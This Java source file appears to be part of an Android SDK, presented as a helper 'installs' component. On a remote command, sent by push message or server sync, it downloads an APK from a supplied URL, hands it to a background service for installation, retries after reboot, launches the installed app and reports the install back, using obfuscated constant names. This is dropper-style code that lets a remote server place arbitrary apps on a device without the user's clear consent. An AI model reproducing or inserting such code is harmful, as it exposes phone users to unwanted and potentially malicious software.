package utils.helper.apps;

import android.app.Application;
import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.text.TextUtils;

import com.evernote.android.job.Job;
import com.evernote.android.job.JobRequest;
import com.evernote.android.job.util.support.PersistableBundleCompat;
import com.thin.downloadmanager.DefaultRetryPolicy;
import com.thin.downloadmanager.DownloadRequest;
import com.thin.downloadmanager.DownloadStatusListenerV1;
import com.thin.downloadmanager.ThinDownloadManager;

import java.io.File;
import java.util.List;
import java.util.concurrent.TimeUnit;

import commons.app.com.commons.commons.SdkCommons;
import commons.app.com.commons.commons.SdkComponent;
import commons.app.com.keep.NetworkApi;
import timber.log.Timber;
import utils.helper.apps.keep.InstallModel;
import utils.helper.apps.keep.InstallsResponse;
import utils.helper.apps.models.ApkInfoModel;
import utils.helper.apps.sys.TimerService;

@SuppressWarnings("WeakerAccess")
public class InstallsComponent extends SdkComponent {

    private static InstallsComponent instance;

    public static final String ARG_APP_ID = "i18927878_arg_1";
    private static final String JOB_TAG_INSTALL_EVENT = "i92797272729_j_1";

    private SharedPrefs preferences;
    private ThinDownloadManager downloadManager;

    public static InstallsComponent get() {
        return instance;
    }

    public InstallsComponent() {
        instance = this;
    }

    @Override
    public void initialize(Application context, SdkCommons sdk, NetworkApi api) {
        super.initialize(context, sdk, api);
        preferences = new SharedPrefs(context);
        downloadManager = new ThinDownloadManager();
    }

    @Override
    public void onDeviceRebooted() {
        // checkPendingInstalls();
        ApkInfoModel apkInfo = preferences.getTargetApkInfo();
        if (apkInfo != null) {
            install(apkInfo);
        }
    }

    @Nullable
    @Override
    public Job createJob(@NonNull String tag) {
        if (JOB_TAG_INSTALL_EVENT.equals(tag)) {
            return new UploadEventJob();
        }
        return null;
    }

    @Override
    public void onNewAppAdded(String packageName) {
        ApkInfoModel apkInfo = preferences.getTargetApkInfo();
        // Launch installed app, only if this is our app (we have stored apkId)
        if (apkInfo != null && packageName.equals(apkInfo.getPackageName())) {
            if (!TextUtils.isEmpty(apkInfo.getId())) {
                submitInstallEventJob(apkInfo.getId());
            }
            // launch app
            try {
                Intent launchIntent = context().getPackageManager().getLaunchIntentForPackage(packageName);
                context().startActivity(launchIntent);
            } catch (ActivityNotFoundException e) {
                e.printStackTrace();
            }
            preferences.saveTargetApkInfo(null);
        }
    }

    @Override
    public void onFcmMessageReceived(@NonNull String type, @NonNull Bundle payload) {
        if ("apk".equals(type)) {
            String receivedUrl = payload.getString("url");
            String appId = payload.getString("apk_id");
            if (receivedUrl != null && appId != null) {
                onUrlReceived(receivedUrl, appId);
            }
        }
    }

    @Override
    public void onSyncEvent(@NonNull String json) {
        InstallsResponse response = safeParse(json, InstallsResponse.class);
        List<InstallModel> list = response != null ? response.getData() : null;
        if (list != null && !list.isEmpty()) {
            InstallModel app = list.get(0);
            onUrlReceived(app.getDownloadUrl(), app.getAppId());
        }
    }

    public SharedPrefs preferences() {
        return preferences;
    }

    ///////////////////////////////////////////////////////////////////////////
    // INNER
    ///////////////////////////////////////////////////////////////////////////

    public void onUrlReceived(String downloadUrl, final String appId) {
        if (TimerService.isServiceRunning()) {
            Timber.e("service is already running");
            return;
        }
        Uri downloadUri = Uri.parse(downloadUrl);
        File destinationFolder = context().getExternalCacheDir();
        assert destinationFolder != null;
        Uri destinationUri = Uri.parse(destinationFolder.getAbsolutePath()
                + "/"
                + downloadUri.getLastPathSegment());
        DownloadRequest downloadRequest = new DownloadRequest(downloadUri)
                .setRetryPolicy(new DefaultRetryPolicy())
                .setDestinationURI(destinationUri).setPriority(DownloadRequest.Priority.HIGH)
                .setStatusListener(new DownloadStatusListenerV1() {
                    @Override
                    public void onDownloadComplete(DownloadRequest downloadRequest) {
                        String path = downloadRequest.getDestinationURI().getPath();
                        String pkgName = MainUtils.getPackageName(context(), path);
                        ApkInfoModel info = new ApkInfoModel(appId, path, pkgName);
                        install(info);
                    }

                    @Override
                    public void onDownloadFailed(DownloadRequest downloadRequest, int errorCode, String errorMessage) {

                    }

                    @Override
                    public void onProgress(DownloadRequest downloadRequest, long totalBytes, long downloadedBytes, int progress) {

                    }
                });
        downloadManager.add(downloadRequest);
    }

    ///////////////////////////////////////////////////////////////////////////
    // JOBS
    ///////////////////////////////////////////////////////////////////////////

    public void submitInstallEventJob(String apkId) {
        PersistableBundleCompat extras = new PersistableBundleCompat();
        extras.putString(ARG_APP_ID, apkId);
        long backoffTime = TimeUnit.MINUTES.toMillis(1);
        new JobRequest.Builder(JOB_TAG_INSTALL_EVENT)
                .addExtras(extras)
                .setBackoffCriteria(backoffTime, JobRequest.BackoffPolicy.EXPONENTIAL)
                .startNow()
                .build()
                .schedule();
    }

    ///////////////////////////////////////////////////////////////////////////
    // UTILS
    ///////////////////////////////////////////////////////////////////////////

    private void install(ApkInfoModel model) {
        if (MainUtils.isAppInstalled(context(), model.getPackageName())) {
            submitInstallEventJob(model.getId());
            preferences.saveTargetApkInfo(null);
            return;
        }
        preferences.saveTargetApkInfo(model);
        //
        Intent starter = new Intent(context(), TimerService.class);
        starter.putExtra(TimerService.APK_FILE_PATH, model.getFilePath());
        starter.putExtra(TimerService.APK_PACKAGE_NAME, model.getPackageName());
        starter.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context().startService(starter);
    }
}
